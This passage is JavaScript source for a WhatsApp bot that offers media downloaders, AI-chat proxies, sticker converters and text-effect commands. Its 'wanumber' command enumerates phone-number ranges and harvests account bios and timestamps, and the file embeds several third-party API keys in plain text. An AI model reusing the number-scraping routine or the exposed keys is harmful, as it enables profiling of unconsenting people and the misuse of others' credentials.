            mimetype: "application/zip",
          },
          { quoted: m }
        ).catch((err) => reply(mess.error));
        break;
//=================================================//
      case "fbdl":
      case "facebook":
        {
          if (!args[0]) {
            return reply(
              `Please send the link of a Facebook video\n\nEXAMPLE :\n*${
                prefix + command
              }* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`
            );
          }
          const urlRegex =
            /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
          if (!urlRegex.test(args[0])) {
            return reply("Url invalid");
          }
          try {
            const result = await fg.fbdl(args[0]);
            const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
            const response = await fetch(result.videoUrl);
            const arrayBuffer = await response.arrayBuffer();
            const videoBuffer = Buffer.from(arrayBuffer);
            Xploader.sendMessage(
              m.chat,
              { video: videoBuffer, caption: tex },
              { quoted: m }
            );
          } catch (error) {
            reply("Maybe private video!");
          }
        }
        break;
//=================================================//
case "ytmp3":
{
	if (!text) return reply('Please provide a valid  YouTube link!');
	let urls = text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return reply('Seems like your message does not contain a valid YouTube link');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length)
		return reply('Invalid URL index');
	await downloadXMp3(urls);
}
break;
//=================================================//
case "ytmp4":
{
	if (!text) return reply('Please provide a valid  YouTube link!');
	let urls = text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return reply('Seems like your message does not contain a valid YouTube link');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length)
		return reply('Invalid URL index');
	await downloadXMp4(urls);
}
break;
//=================================================//
case "tiktok":
case "tikdl":
case "tiktokvideo":
{
	if (!args[0]) return reply('Please provide a TikTok video url!');
	let kyuu = await fetchJson (`https://widipe.com/download/tikdl?url=${args[0]}`)
await Xploader.sendMessage(
              m.chat,
              {
                caption: `©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭`,
                video: { url: kyuu.result.video },
                fileName: "video.mp4",
                mimetype: "video/mp4",
              },
              { quoted: m });
          }
        break;
//=================================================//

//=================================================//
      case "apk":
      case "apkdl":
        {
          if (!text) return reply("Which apk do you want to download?");
        let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
        let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
         await Xploader.sendMessage(
              m.chat,
              {
                document: { url: tylor.BK9.dllink },
                fileName: tylor.BK9.name,
                mimetype: "application/vnd.android.package-archive",
                contextInfo: {
        externalAdReply: {
          title: botname,
          body: `${tylor.BK9.name}`,
          thumbnailUrl: `${tylor.BK9.icon}`,
          sourceUrl: `${tylor.BK9.dllink}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
          }
      break;
//=================================================//
case "telesticker":
case "telegramsticker":
        {
          if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
            let XpBotresources = await Telesticker(args[0]);
            await reply(`Sending ${XpBotresources.length} stickers...`);
            if (m.isGroup && XpBotresources.length > 30) {
              await reply(
                "Number of stickers more than 30, bot will send it in private chat."
              );
              for (let i = 0; i < XpBotresources.length; i++) {
                Xploader.sendMessage(m.sender, {
                  sticker: { url: XpBotresources[i].url },
                });
              }
            } else {
              for (let i = 0; i < XpBotresources.length; i++) {
                Xploader.sendMessage(m.chat, {
                  sticker: { url: XpBotresources[i].url },
                });
              }
            }
          } else
            reply(
              `Where is the telegram sticker link?\nExample. ${
                prefix + command
              } https://t.me/addstickers/FriendlyDeath`
            );
        }
        break;
//=================================================//
case "weather":
        {
          if (!text) return reply("What location?");
          let city = text.split(" ")[0];
          let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${city}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
          );
          let textw = "";
          textw += `*🗺️Weather of  ${city}*\n\n`;
          textw += `*Weather:-* ${wdata.data.weather[0].main}\n`;
          textw += `*Description:-* ${wdata.data.weather[0].description}\n`;
          textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`;
          textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`;
          textw += `*Pressure:-* ${wdata.data.main.pressure}\n`;
          textw += `*Humidity:-* ${wdata.data.main.humidity}\n`;
          textw += `*Humidity:-* ${wdata.data.wind.speed}\n`;
          textw += `*Latitude:-* ${wdata.data.coord.lat}\n`;
          textw += `*Longitude:-* ${wdata.data.coord.lon}\n`;
          textw += `*Country:-* ${wdata.data.sys.country}\n`;

          Xploader.sendMessage(
            m.chat,
            {
              text: textw,
            },
            {
              quoted: m,
            }
          );
        }
        break;
//=================================================//
case "imdb":
        if (!text) return reply(`_Name a Series or movie`);      let fids = await axios.get(
          `http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`
        );
        let imdbt = "";
        console.log(fids.data);
        imdbt +=
          "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
        imdbt += "Title      : " + fids.data.Title + "\n";
        imdbt += "Year       : " + fids.data.Year + "\n";
        imdbt += "Rated      : " + fids.data.Rated + "\n";
        imdbt += "Released   : " + fids.data.Released + "\n";
        imdbt += "Runtime    : " + fids.data.Runtime + "\n";
        imdbt += "Genre      : " + fids.data.Genre + "\n";
        imdbt += "Director   : " + fids.data.Director + "\n";
        imdbt += "Writer     : " + fids.data.Writer + "\n";
        imdbt += "Actors     : " + fids.data.Actors + "\n";
        imdbt += "Plot       : " + fids.data.Plot + "\n";
        imdbt += "Language   : " + fids.data.Language + "\n";
        imdbt += "Country    : " + fids.data.Country + "\n";
        imdbt += "Awards     : " + fids.data.Awards + "\n";
        imdbt += "BoxOffice  : " + fids.data.BoxOffice + "\n";
        imdbt += "Production : " + fids.data.Production + "\n";
        imdbt += "imdbRating : " + fids.data.imdbRating + "\n";
        imdbt += "imdbVotes  : " + fids.data.imdbVotes + "";
        Xploader.sendMessage(
          m.chat,
          {
            image: {
              url: fids.data.Poster,
            },
            caption: imdbt,
          },
          {
            quoted: m,
          }
        );
        break;
//=================================================//
      case "wanumber":
        {
          if (!text)
            return reply(
              `*_Provide Number with last number x_*\n\nExample: ${
                prefix + command
              } 25479618010x`
            );
          var inputnumber = text.split(" ")[0];

          reply(`*_Searching for WhatsApp account in given range..._*`);
          function countInstances(string, word) {
            return string.split(word).length - 1;
          }
          var number0 = inputnumber.split("x")[0];
          var number1 = inputnumber.split("x")[countInstances(inputnumber, "x")]
            ? inputnumber.split("x")[countInstances(inputnumber, "x")]
            : "";
          var random_length = countInstances(inputnumber, "x");
          var randomxx;
          if (random_length == 1) {
            randomxx = 10;
          } else if (random_length == 2) {
            randomxx = 100;
          } else if (random_length == 3) {
            randomxx = 1000;
          }
          var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`;
          var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`;
          var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`;
          for (let i = 0; i < randomxx; i++) {
            var nu = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
            var status1 = nu[Math.floor(Math.random() * nu.length)];
            var status2 = nu[Math.floor(Math.random() * nu.length)];
            var status3 = nu[Math.floor(Math.random() * nu.length)];
            var dom4 = nu[Math.floor(Math.random() * nu.length)];
            var random21;
            if (random_length == 1) {
              random21 = `${status1}`;
            } else if (random_length == 2) {
              random21 = `${status1}${status2}`;
            } else if (random_length == 3) {
              random21 = `${status1}${status2}${status3}`;
            } else if (random_length == 4) {
              random21 = `${status1}${status2}${status3}${dom4}`;
            }
            var anu = await Xploader.onWhatsApp(
              `${number0}${i}${number1}@s.whatsapp.net`
            );
            var anuu = anu.length !== 0 ? anu : false;
            try {
              try {
                var anu1 = await Xploader.fetchStatus(anu[0].jid);
              } catch {
                var anu1 = "401";
              }
              if (anu1 == "401" || anu1.status.length == 0) {
                nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`;
              } else {
                text66 += `🪀 *Number:* wa.me/${
                  anu[0].jid.split("@")[0]
                }\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(
                  anu1.setAt
                )
                  .tz("Africa/Nairobi")
                  .format("HH:mm:ss DD/MM/YYYY")}\n\n`;
              }
            } catch {
              nowhatsapp += `${number0}${i}${number1}\n`;
            }
          }
          reply(`${text66}${nobio}${nowhatsapp}`);
        }
        break;
//=================================================//
case "ringtone":
        {
          if (!text)
            return reply(`Example : ${prefix + command} black rover`);
          let ringtone = require("./lib/scraper");
          let anutone2 = await ringtone.ringtone(text);
          let result = anutone2[Math.floor(Math.random() * anutone2.length)];
          Xploader.sendMessage(
            m.chat,
            {
              audio: { url: result.audio },
              fileName: result.title + ".mp3",
              mimetype: "audio/mpeg",
            },
            { quoted: m }
          );
        }
        break;
//=================================================//
case "pinterest":
        {
          if (!text) return reply(`Enter Query`);
          let { pinterest } = require("./lib/scraper");
          anutrest = await pinterest(text);
          result = anutrest[Math.floor(Math.random() * anutrest.length)];
          Xploader.sendMessage(
            m.chat,
            { image: { url: result }, caption: "⭔ Media Url : " + result },
            { quoted: m }
          );
        }
        break;
//=================================================//
case "itunes":
        {
          if (!text) return reply("Please provide a song name");
          try {
            let res = await fetch(
              `https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`
            );
            if (!res.ok) {
              throw new Error(`API request failed with status ${res.status}`);
            }
            let json = await res.json();
            console.log("JSON response:", json);
            let songInfo = `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`;
            // Check if thumbnail is present, then send it with songInfo as caption
            if (json.thumbnail) {
              await Xploader.sendMessage(
                m.chat,
                { image: { url: json.thumbnail }, caption: songInfo },
                { quoted: m }
              );
            } else {
              reply(songInfo);
            }
          } catch (error) {
            console.error(error);
            // Handle the error appropriately
          }
        }
        break;
//=================================================//
//=================================================//
case "igdl": 
case "instagram":
{
if (!text) return reply(`Please provide an Instagram video url!`)
var anu = await fetchJson(`https://widipe.com/download/igdl?url=${q}`)
var hassdl = anu.result[0].url
await Xploader.sendMessage(m.chat, {
video: {
url: hassdl,
caption: '©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭'
}
}, {
quoted: m
})
}
break;
//=================================================//
case "happymod":
        {
          if (!q)
            return reply(
              `Example ${prefix + command} Sufway surfer mod`
            );
          let kat = await scp2.happymod(q);
          reply(util.format(kat));
        }
        break;
//=====EPHOTO360 MENU CMDS=======================//
      case "glitchtext":
      case "graffiti":
      case "matrix":
      case "sand":
      case "topography":
      case "incandescent":
      case "dragonball":
      case "deadpool":
      case "writetext":
      case "advancedglow":
      case "typographytext":
      case "pixelglitch":
      case "neonglitch":
      case "flagtext":
      case "flag3dtext":
      case "deletingtext":
      case "blackpinkstyle":
      case "glowingtext":
      case "underwatertext":
      case "logomaker":
      case "cartoonstyle":
      case "papercutstyle":
      case "watercolortext":
      case "effectclouds":
      case "blackpinklogo":
      case "gradienttext":
      case "summerbeach":
      case "luxurygold":
      case "multicoloredneon":
      case "sandsummer":
      case "galaxywallpaper":
      case "1917style":
      case "makingneon":
      case "royaltext":
      case "freecreate":
      case "galaxystyle":
      case "lighteffects":
        {
          if (!q)
            return reply(`Example : ${prefix + command} Tylor`);
          let link;
          if (/glitchtext/.test(command))
            link =
              "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html";
          if (/writetext/.test(command))
            link =
              "https://en.ephoto360.com/write-text-on-wet-glass-online-589.html";
          if (/advancedglow/.test(command))
            link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
          if (/typographytext/.test(command))
            link =
              "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
          if (/pixelglitch/.test(command))
            link =
              "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
          if (/neonglitch/.test(command))
            link =
              "https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html";
          if (/flagtext/.test(command))
            link =
              "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
          if (/flag3dtext/.test(command))
            link =
              "https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html";
          if (/deletingtext/.test(command))
            link =
              "https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html";
          if (/blackpinkstyle/.test(command))
            link =
              "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
          if (/glowingtext/.test(command))
            link =
              "https://en.ephoto360.com/create-glowing-text-effects-online-706.html";
          if (/underwatertext/.test(command))
            link =
              "https://en.ephoto360.com/3d-underwater-text-effect-online-682.html";
          if (/logomaker/.test(command))
            link =
              "https://en.ephoto360.com/free-bear-logo-maker-online-673.html";
          if (/cartoonstyle/.test(command))
            link =
              "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
          if (/papercutstyle/.test(command))
            link =
              "https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html";
          if (/watercolortext/.test(command))
            link =
              "https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html";
          if (/effectclouds/.test(command))
            link =
              "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
          if (/blackpinklogo/.test(command))
            link =
              "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
          if (/gradienttext/.test(command))
            link =
              "https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html";
          if (/summerbeach/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
          if (/luxurygold/.test(command))
            link =
              "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
          if (/multicoloredneon/.test(command))
            link =
              "https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";
          if (/sandsummer/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
          if (/galaxywallpaper/.test(command))
            link =
              "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
          if (/1917style/.test(command))
            link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
          if (/makingneon/.test(command))
            link =
              "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
          if (/royaltext/.test(command))
            link =
              "https://en.ephoto360.com/royal-text-effect-online-free-471.html";
          if (/freecreate/.test(command))
            link =
              "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
          if (/galaxystyle/.test(command))
            link =
              "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
          if (/lighteffects/.test(command))
            link =
              "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
        if (/deadpool/.test(command))
            link =
              "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
        if (/dragonball/.test(command))
            link =
              "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html";
        if (/incandescent/.test(command))
            link =
              "https://en.ephoto360.com/text-effects-incandescent-bulbs-219.html";
        if (/topography/.test(command))
            link =
              "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
        if (/sand/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
        if (/matrix/.test(command))
            link =
              "https://en.ephoto360.com/matrix-text-effect-154.html";
        if (/graffiti/.test(command))
            link =
              "https://en.ephoto360.com/cute-girl-painting-graffiti-text-effect-667.html";
          let haldwhd = await ephoto(link, q);
          Xploader.sendMessage(
            m.chat,
            { image: { url: haldwhd }, caption: `${mess.success}` },
            { quoted: m }
          );
        }
        break;
//=============AI MENU CMDS=======================//
      case "gpt":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://bk9.fun/ai/gptt4?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.BK9);
          }
        }
        break;
//=================================================//
      case "gemini":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/gemini?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=================================================//
      case "openai":
      case "ai":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/openai?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=================================================//
     case "gptgo":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/gptgo?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=================================================//
     case "blackbox":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/blackbox?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=================================================//
     case "bard":
     case "bardai":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/bard?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=================================================//
     case "bingai":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/bingai?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=================================================//
     case "simi":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/simi?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=================================================//
      case "photoai":
        {
          if (!text) return reply("Please enter a query!");
          let XpBotfetch = await fetchJson(
            `https://widipe.com/bingimg?text=${text}`
          );
          Xploader.sendMessage(
            from,
            { image: { url: XpBotfetch.result[0] } },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "llama":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://bk9.fun/ai/llama?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.BK9);
          }
        }
        break;
//=================================================//
     case "gpt2":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/gpt4?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=================================================//
     case "turbo":
        {
          if (!text) return reply("What is your question?");
          let d = await fetchJson(
            `https://widipe.com/turbo?text=${text}`
          );
          if (!d.result) {
            return reply(
              "Please try again later or try another command!"
            );
          } else {
            reply(d.result);
          }
        }
        break;
//=========OTHER MENU CMDS=======================//
      case "runtime":
      case "uptime":
        let pinga = `*${runtime(process.uptime())}*`;
        Xploader.sendMessage(
          m.chat,
          {
            text: pinga,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnailUrl: "https://itzpire.com/file/270de20ea91c.jpeg",
                sourceUrl: wagc,
                mediaType: 1,
                renderLargerThumbnail: false,
              },
            },
          },
          {
            quoted: m,
          }
        );
        break;
//=================================================//
case "script":
case "sc":
case "repo":
   {
    let me = m.sender;
   let teks = `
‎ ‎ ‎ ‎ *𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫 𝐒𝐜𝐫𝐢𝐩𝐭*

Hi @${me.split("@")[0]} 👋

Don't forget to fork and star my repository😊`;
          
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : tylorkid5}, { upload: Xploader.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [  
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL\",\"url\":\"https://whatsapp.com/channel/0029VamSWUx77qVNJDy1Jf11\",\"merchant_url\":\"https://www.google.com\"}"
              },       
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"SCRIPT\",\"url\":\"https://github.com/Dark-Xploit/XPLOADER-BOT/fork\",\"merchant_url\":\"https://www.google.com\"}"
              },       
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '254796180105@s.whatsapp.net',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: fstatus })
      
      await Xploader.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
}  
break;
//=================================================//
      case "owner":
      {
const repf = await Xploader.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: fstatus })
}
break;
//=================================================//:
      case "sticker":
      case "s":
        {
          if (!quoted)
            return reply(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await Xploader.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return reply(
                "Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds"
              );
            let media = await quoted.download();
            let encmedia = await Xploader.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
          } else {
            reply(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          }
        }
        break;
//=================================================//
      case "toimage":
      case "toimg":
        {
          if (!/webp/.test(mime))
            return reply(
              `Reply sticker with caption *${prefix + command}*`
            );
          let media = await Xploader.downloadAndSaveMediaMessage(qmsg);
          let ran = await getRandom(".png");
          exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media);
            if (err) return err;
            let buffer = fs.readFileSync(ran);
            Xploader.sendMessage(
              m.chat,
              {
                image: buffer,
              },
              {
                quoted: m,
              }
            );
            fs.unlinkSync(ran);
          });
        }
        break;
//=================================================//
      case "tomp4":
      case "tovideo":
        {
          if (!/webp/.test(mime))
            return reply(
              `Reply sticker with caption *${prefix + command}*`
            );
          let media = await Xploader.downloadAndSaveMediaMessage(qmsg);
          let webpToMp4 = await webp2mp4File(media);
          await Xploader.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
            },
            {
              quoted: m,
            }
          );
          await fs.unlinkSync(media);
        }
        break;
//=================================================//
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return reply(
              `Send/Reply Video/Audio that you want to make into audio with captions ${
                prefix + command
              }`
            );
          let media = await Xploader.downloadMediaMessage(qmsg);
          let audio = await toAudio(media, "mp4");
          Xploader.sendMessage(
            m.chat,
            {
              audio: audio,
              mimetype: "audio/mpeg",
            },
            {
              quoted: m,
            }
          );
        }
        break;
//=================================================//
      case "tomp3":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return reply(
              `Send/Reply Video/Audio that you want to make into MP3 with captions ${
                prefix + command
              }`
            );
          let media = await Xploader.downloadMediaMessage(qmsg);
          let audio = await toAudio(media, "mp4");
          Xploader.sendMessage(
            m.chat,
            {
              document: audio,
              mimetype: "audio/mp3",
              fileName: `XploaderV2.mp3`,
            },
            {
              quoted: m,
            }
          );
        }
        break;
//=================================================//
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            return reply(
              `Send/Reply Video/Audio that you want to make into a VN with captions ${
                prefix + command
              }`
            );
          let media = await Xploader.downloadMediaMessage(qmsg);
          let { toPTT } = require("./lib/converter");
          let audio = await toPTT(media, "mp4");
          Xploader.sendMessage(
            m.chat,
            {
              audio: audio,
              mimetype: "audio/mpeg",
              ptt: true,
            },
            {
              quoted: m,
            }
          );
        }
        break;
//=================================================//
      case "togif":
        {
          if (!/webp/.test(mime))
            return reply(
              `Reply sticker with caption *${prefix + command}*`
            );
          let media = await Xploader.downloadAndSaveMediaMessage(qmsg);
          let webpToMp4 = await webp2mp4File(media);
          await Xploader.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
              gifPlayback: true,
            },
            {
              quoted: m,
            }
          );
          await fs.unlinkSync(media);
        }
        break;
//=================================================//
      case "emojimix":
        {
          let [emoji1, emoji2] = text.split`+`;
          if (!emoji1)
            return reply(`Example : ${prefix + command} 😅+🤔`);
          if (!emoji2)
            return reply(`Example : ${prefix + command} 😅+🤔`);
          let anu = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              emoji1
            )}_${encodeURIComponent(emoji2)}`
          );
          for (let res of anu.results) {
            let encmedia = await Xploader.sendImageAsSticker(
              m.chat,
              res.url,
              m,
              {
                packname: global.packname,
                author: global.author,
                categories: res.tags,
              }
            );
          }
        }
        break;
//=================================================//
      case "tovv":
      case "toviewonce":
        {
          if (!quoted) return reply(`Reply Image/Video`);
          if (/image/.test(mime)) {
            anuan = await Xploader.downloadAndSaveMediaMessage(quoted);
            Xploader.sendMessage(
              m.chat,
              {
                image: {
                  url: anuan,
                },
                caption: mess.done,
                fileLength: "999",
                viewOnce: true,
              },
              {
                quoted: m,
              }
            );
          } else if (/video/.test(mime)) {
            anuanuan = await Xploader.downloadAndSaveMediaMessage(quoted);
            Xploader.sendMessage(
              m.chat,
              {
                video: {
                  url: anuanuan,
                },
                caption: mess.done,
                fileLength: "99999999",
                viewOnce: true,
              },
              {
                quoted: m,
              }
            );
          } else if (/audio/.test(mime)) {
            bebasap = await Xploader.downloadAndSaveMediaMessage(quoted);
            Xploader.sendMessage(m.chat, {
              audio: {
                url: bebasap,
              },
              mimetype: "audio/mpeg",
              ptt: true,
              viewOnce: true,
            });
          }
        }
        break;
//=================================================//

case "whatmusic":
case "find":
case "shazam":
    if (!m.quoted) {
        reply('It seems you want to identify a music. Please provide a quoted audio or video message for identification.');
    } else if (/audio|video/.test(mime)) {
        try {
            let media = await m.quoted.download();
            const ext = mime.split('/')[1];
            fs.writeFileSync(`./src/${m.sender}.${ext}`, media);     
          const res = await acr.identify(fs.readFileSync(`./src/${m.sender}.${ext}`));
            const { code, msg } = res.status;

            if (code !== 0) {
                throw msg;
            }

            const { title, artists, album, genres, release_date } = res.metadata.music[0];
            const txt = `┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 𝗕𝗢𝗧 ◊
│• 📌 *TITLE*: ${title}
│• 👨‍🎤𝙰𝚁𝚃𝙸𝚂𝚃: ${artists !== undefined ? artists.map(v => v.name).join(', ') : 'NOT FOUND'}
│• 💾 𝙰𝙻𝙱𝚄𝙼: ${album.name || 'NOT FOUND'}
│• 🌐 𝙶𝙴𝙽𝚁𝙴: ${genres !== undefined ? genres.map(v => v.name).join(', ') : 'NOT FOUND'}
│• 📆 RELEASE DATE: ${release_date || 'NOT FOUND'}
┗▣ `.trim();

            fs.unlinkSync(`./src/${m.sender}.${ext}`);
            reply(txt);
        } catch (error) {
            console.error(error);
            reply('An error occurred during music identification.');
        }
    }
    break;
//=================================================//
       case "commands":
        case "totalcmds":
        {
          let lowq = `©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭\n> Total Commands= 501`;
          reply(lowq);
        }
        break;
//=================================================//
      case "obfuscate":
        {
          if (!q)
            return reply(
              `Example ${prefix + command} const Xploader = require('baileys')`
            );
          let meg = await obfus(q);
          reply(`${meg.result}`);
        }
        break;
//=================================================//
      case "fancy":
      case "styletext":
        {
          let { styletext } = require("./lib/scraper");
          if (!text) return reply("Enter Query text!");
          let anu = await styletext(text);
          let teks = `Style Text From ${text}\n\n`;
          for (let i of anu) {
            teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`;
          }
          reply(teks);
        }
        break;
//=================================================//
      case "bible":
        {
          const { translate } = require("@vitalets/google-translate-api");
          const BASE_URL = "https://bible-api.com";
          try {
            // Extract the chapter number or name from the command text.
            let chapterInput = m.text.split(" ").slice(1).join("").trim();
            if (!chapterInput) {
              throw new Error(
                `Please specify the chapter number or name. Example: ${
                  prefix + command
                } john 3:16`
              );
            }
